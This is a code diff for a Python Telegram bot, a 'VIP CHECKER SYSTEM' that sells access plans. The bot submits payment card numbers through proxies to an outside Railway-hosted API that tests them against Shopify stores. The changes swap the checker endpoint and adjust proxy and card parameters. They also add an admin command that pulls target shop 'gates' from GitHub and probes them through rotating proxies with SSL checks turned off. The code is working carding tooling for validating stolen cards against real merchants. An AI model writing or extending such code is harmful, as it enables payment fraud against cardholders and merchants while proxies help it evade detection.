@@ -84,8 +84,8 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# [تم التحديث الجوهري] تركيب الـ API الجديد المشفر والمستقر المرفوع على Railway لإنهاء الـ Errors والبطء كلياً
-SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
+# [تم التحديث] تركيب الـ API الجديد الفريش والمتوافق بالكامل على منصة Railway
+SHOPIFY_API_URL_1 = 'https://web-production-54ad4.up.railway.app/sh'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -208,7 +208,7 @@ ANIME_GIFS = [
     "https://i.giphy.com/l3vR1603ssT69vWb6.gif",        
     "https://i.giphy.com/XjY7D2H47Y0j6.gif",        
     "https://i.giphy.com/20K8866h4693G.gif",        
-    "https://i.giphy.com/d3mlE7uhRoVX2Im4.gif"         
+    "https://i.giphy.com/ d3mlE7uhRoVX2Im4.gif"         
 ]
 
 PLANS = {
@@ -433,7 +433,7 @@ async def is_user_joined(uid, bot):
     return True
 
 async def send_welcome_menu(update_or_bot, uid, plan, limit):
-    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
     
     t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
@@ -549,10 +549,14 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# [تم التحديث والإصلاح الشامل] تطبيق نظام تشفير البارامترات الآمن ومنع تلف الروابط وتوسيع خيارات الاستجابة
+# [تم التحديث والإصلاح الشامل لنظام السيرفر الجديد /sh لتنظيف هيكلة البروكسي وبناء معاملات الاستدعاء بشكل متوافق ومحمي]
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
+        
+        # هندسة وتطهير صيغة البروكسي الحية وعزل بادئات البروتوكول (http:// أو socks5://) ليتطابق مع مواصفات الـ API الجديد
+        if proxy_str and "://" in proxy_str:
+            proxy_str = proxy_str.split("://")[-1]
         
         # ترميز وتشفير الفيزا بشكل آمن لمنع تدمير الرابط بسبب علامة الحصر |
         card_encoded = quote(str(card).strip())
@@ -564,8 +568,8 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
         
-        # بناء المسار البرمجي المشفر بشكل سليم 100% للسيرفر
-        req_url = f"{api_url}?site={site_encoded}&cc={card_encoded}{proxy_param}"
+        # بناء مسار الاستدعاء المطابق والآمن 100% للسيرفر الجديد فريش
+        req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -590,7 +594,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         if not rj.get('status', True) and 'error' in rj:
             return {'status': 'Site Error', 'message': rj.get('error', 'API Blocked'), 'card': card, 'retry': True}
             
-        # إضافة المفاتيح البديلة المتوقعة لضمان قراءة رد السيرفر بأي صيغة كانت دون اعتبارها Dead عشوائياً
+        # استقراء الردود بمصفوفة مفاتيح موسعة لمنع اعتبار الردود الصحيحة كميتة عشوائياً
         rm = str(rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', ''))))))).strip()
         pr = rj.get('Price', rj.get('amount', "$10.00")) 
         gt = rj.get('Gateway', 'Shopify')
@@ -755,7 +759,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global _MAINTENANCE_MODE
+    global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     if not update.message: return
     uid = update.effective_user.id
     USER_LAST_REQ[uid] = time.time()
@@ -1047,6 +1051,62 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
+    # [أمر حصري وخارق للآدمن فقط] جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
+    elif cmd == "checkgates":
+        if uid not in ADMIN_ID: return
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching gates from GitHub...')}</b>", use_gif=True)
+        try:
+            async with aiohttp.ClientSession() as s:
+                async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
+                    if r.status == 200:
+                        raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
+                    else:
+                        return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
+            
+            if not raw_sites:
+                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('The GitHub sites file is empty.')}</b>")
+                
+            admin_proxies = await get_all_user_proxies(uid)
+            proxies_list = list(admin_proxies) if admin_proxies else []
+            
+            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates via active proxies...')}</b>")
+            
+            working_sites = []
+            dead_count = 0
+            
+            async def _validate_gate(site_url, session):
+                nonlocal dead_count
+                p_url = random.choice(proxies_list)['proxy_url'] if proxies_list else None
+                target_url = f"https://{site_url}" if not site_url.startswith("http") else site_url
+                try:
+                    async with session.get(target_url, proxy=p_url, timeout=5, ssl=False) as resp:
+                        if resp.status in [200, 301, 302, 403]:
+                            working_sites.append(site_url)
+                            return
+                except Exception:
+                    pass
+                dead_count += 1
+
+            connector = aiohttp.TCPConnector(limit=50, ssl=False)
+            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=8)) as test_session:
+                tasks = [_validate_gate(site, test_session) for site in raw_sites]
+                await asyncio.gather(*tasks)
+            
+            _CACHED_SHOPIFY_SITES = working_sites
+            _LAST_SITES_FETCH = time.time()
+            
+            res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
+            
+├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
+├ <b>{CE_CHECK} {sf('Active Working')}:</b> <code>{sf(str(len(working_sites)))}</code>
+╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
+
+<i>{sf('In-memory cache synchronized successfully!')}</i>"""
+            await styled_edit(tm, res_msg)
+            
+        except Exception as e:
+            await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Error Processing')}:</b> {sf(str(e))}")
+
 # ====================== CALLBACK FUNCTIONS ======================
 async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
@@ -1069,7 +1129,7 @@ async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
     plan = await get_user_plan(uid)
     limit = get_cc_limit(plan, uid)
-    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
     
     t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
